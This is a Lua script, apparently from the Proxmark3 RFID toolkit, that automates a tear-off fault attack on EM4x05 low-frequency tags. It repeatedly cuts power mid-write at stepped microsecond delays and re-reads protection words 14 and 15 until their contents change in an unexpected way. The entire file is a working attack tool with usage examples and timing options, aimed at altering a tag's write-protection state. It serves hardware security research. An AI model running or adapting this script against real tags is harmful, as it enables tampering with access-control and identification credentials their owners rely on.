local getopt = require('getopt')
local ansicolors = require('ansicolors')

copyright = 'Iceman'
author =  [[
'Author   Iceman
 CoAuthor Doegox
]]
version = 'v0.9.9'
desc = [[
This is scripts loops though a tear attack and reads expected value.
]]
example = [[
    script run lf_em_tearoff_protect -n 2 -s 200 -e 400

    Trying repeatedly for a fixed timing, forever or till success:
    script run lf_em_tearoff_protect -s 400 -e 400
]]
usage = [[
script run lf_em_tearoff_protect [-h] [-n <steps us>] [-p <pwd>] [-s <start us>] [-e <end us>]
]]
arguments = [[
    -h                 This help
    -n <steps us>      steps in milliseconds for each tear-off
    -p <pwd>           (optional) use a password
    -s <delay us>      initial start delay
    -e <delay us>      end delay, must be larger or equal to start delay
    end
]]

---
-- This is only meant to be used when errors occur
local function oops(err)
    print('ERROR:', err)
    core.clearCommandBuffer()
    return nil, err
end
---
-- Usage help
local function help()
    print(copyright)
    print(author)
    print(version)
    print(desc)
    print(ansicolors.cyan..'Usage'..ansicolors.reset)
    print(usage)
    print(ansicolors.cyan..'Arguments'..ansicolors.reset)
    print(arguments)
    print(ansicolors.cyan..'Example usage'..ansicolors.reset)
    print(example)
end

local function main(args)

    --[[
    Basically it does the following,
    
    1. hw tear
    2. lf em 4x05_write 
    3. lf em 4x05_read
    
    The first two commands dont need a feedback from the system, so going with core.console commands.
    Since the read needs demodulation of signal I opted to add that function from cmdlfem4x.c to the core lua scripting
        core.em4x05_read(addr, password)
    
    --]]
    local n, password, sd, ed
    
    for o, a in getopt.getopt(args, 'he:s:a:p:n:r:w:') do
        if o == 'h' then return help() end
        if o == 'n' then n = a end
        if o == 'p' then password = a end
        if o == 'e' then ed = tonumber(a) end
        if o == 's' then sd = tonumber(a) end
    end

    password = password or ''
    if #password ~= 8 then
        password = ''
    end
    
    local word14, err14 =  core.em4x05_read(14, password)
    if err14 then
        return oops(err14)
    end
    local word15, err15 =  core.em4x05_read(15, password)
    if err15 then
        return oops(err15)
    end
    local rd_value = ('%08X'):format(bit.bor(word14,word15))
    local wr_value = '00000000'
    n = n or 2
    sd = sd or 2000
    ed = ed or 2100

    if sd > ed then
        return oops('start delay can\'t be larger than end delay', sd, ed)
    end

    print('==========================================')    
    print('Starting EM4x05 tear off :: target PROTECT')

    if password then
        print('target pwd', password)
    end
    print('target stepping', n)
    print('target delay', sd ,ed)
    print('read value', rd_value)
    print('write value', wr_value)
    print('==========================================')    
    
    local res_tear = 0
    local res_nowrite = 0
    
    local set_tearoff_delay = 'hw tearoff --delay %d'
    local enable_tearoff = 'hw tearoff --on'
    
    local wr_template = 'lf em 4x05_write %s %s %s'

    -- fix at one specific delay
    if sd == ed then
       n = 0
    end

    local tries = 0
    while sd <= ed do
    
        -- increase loop
        sd = sd + n
        
        if tries == 20 then
            tries = 0
            sd = sd + 1
            ed = ed + 1 
            print(ansicolors.cyan..'[!] Tried 20 times, increased delay with 1us'..ansicolors.reset)
        end
    
        io.flush()
        if core.kbd_enter_pressed() then
            print("aborted by user")
            break
        end

        core.clearCommandBuffer()

        local c = set_tearoff_delay:format(sd)
        core.console(c);
        core.console(enable_tearoff)

        c = wr_template:format(99, wr_value, password)
        core.console(c)

        word14, err14 =  core.em4x05_read(14, password)
        if err14 then
            return oops(err14)
        end
        
        local wordstr14 = ('%08X'):format(word14)

        word15, err15 =  core.em4x05_read(15, password)
        if err15 then
            return oops(err15)
        end
        
        local wordstr15 = ('%08X'):format(word15)

        if (not (wordstr14 == '00000000' and wordstr15 == wr_value)) and (not (wordstr14 == wr_value and wordstr15 == '00000000')) then
            print((ansicolors.yellow..'[!] TEAR OFF occurred:'..ansicolors.reset..' 14:%08X 15:%08X'):format(word14, word15))
        end
        
        if wordstr14 == rd_value then
            if wordstr15 ~= rd_value and  wordstr15 ~= wr_value then
                print((ansicolors.red..'[!] tear off result:  '..ansicolors.reset..' 14:%08X 15:%08X'):format(word14, word15))
                return oops('Success?')
            end
            
            if wordstr15 == rd_value then
                print(ansicolors.red..'[!] need to reset'..ansicolors.reset)
                c = wr_template:format(99, wr_value, password)
                core.console(c)
                tries = 0
            end
        else        
            print('...')
        end
        tries = tries + 1
    end
end

--[[
In the future, we may implement so that scripts are invoked directly
into a 'main' function, instead of being executed blindly. For future
compatibility, I have done so, but I invoke my main from here.
--]]
main(args)
